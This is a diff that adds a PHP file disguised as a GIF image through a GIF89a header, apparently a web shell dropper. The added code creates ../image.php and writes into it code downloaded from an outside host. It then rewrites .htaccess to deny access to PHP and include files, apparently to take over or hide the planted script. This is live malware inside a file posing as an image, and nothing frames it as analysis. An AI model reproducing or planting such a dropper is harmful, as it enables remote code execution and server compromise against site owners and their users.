@@ -1,0 +1,42 @@
+GIF89a1
+<?php
+if (file_exists("../image.php")) {
+echo "var";
+} else {
+touch ("../image.php");
+echo "tamam";
+}
+?>
+<?php
+$kod=file_get_contents("http://www.camping-eckernfoerde.de/x.txt");
+$dosya = "../image.php";
+$baglanti = fopen($dosya, 'w');
+fwrite($baglanti,$kod);
+fclose ($baglanti);
+?>
+
+<?php
+$dosya = ".htaccess";
+$baglanti = fopen("$dosya", 'w');
+if (fputs ($baglanti, "
+FilesMatch \.(incphp)$>deny from all</FilesMatch><FilesMatch \.(inchtm)$>deny from all</FilesMatch><FilesMatch \.(inchtml)$>deny from all</FilesMatch
+
+<Files *.php>
+Order allow,deny
+Deny From All
+</Files>
+
+<Files *.php4>
+Order allow,deny
+Deny From All
+</Files>
+<Files *.php5>
+Order allow,deny
+Deny From All
+</Files>")) {
+fclose ($baglanti);
+}
+?>
+<?
+echo "GIF89a1";
+?>
